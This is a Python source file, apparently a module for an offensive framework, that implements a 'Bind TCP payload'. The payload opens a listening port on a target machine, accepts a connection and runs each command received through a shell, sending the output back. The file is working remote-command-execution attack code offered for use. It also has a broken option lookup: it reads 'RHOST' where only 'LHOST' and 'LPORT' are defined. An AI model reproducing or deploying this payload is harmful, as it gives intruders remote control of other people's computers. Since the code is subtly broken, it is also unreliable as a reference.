import pyfiglet
from collections import OrderedDict
import socket
import subprocess,os

MODULE_TYPE = "payload"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Bind TCP payload',
            'Rank':'Good',
            'Platform':'Windows/Linux/Mac',
            'architectures':'x86/64 bit processors',
            'Description': 'This script opens a port on the target machine and waits for a connection from the attacker.  ',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('LHOST', ('', True,'Enter Attacker IP')),
            ('LPORT', ('', True,'Enter Attacker port'))
           
               
                ])
                }
    def logo(self):
    	title = 'Bind TCP payload '
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set LHOST <ip_address> | set LPORT <port>, then run")
   
    
    
    
    def execute(self):
        self.logo()
        BIND_IP = self.info['Options']['RHOST'][0]
        BIND_PORT = self.info['Options']['LPORT'][0]
        # Create a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((BIND_IP, BIND_PORT))
        sock.listen(1)
        print(f"[*] Listening on {BIND_IP}:{BIND_PORT}...")
        # Accept incoming connection
        client_socket, client_address = sock.accept()
        print(f"[+] Connection from {client_address}")
        # Handle commands from the attacker
        while True:
        	try:
        		# Receive command from attacker
        		command = client_socket.recv(1024).decode()
        		if not command:
        			break
        		# Execute command on the target
        		output = subprocess.getoutput(command)
        		# Send output back to the attacker
        		client_socket.send(output.encode())
        	except Exception as e:
        		print(f"[-] Error: {e}")
        		return
        # Close the connection
        client_socket.close()
        sock.close()
        
        return f"[+] Waiting for Attacker ..."
    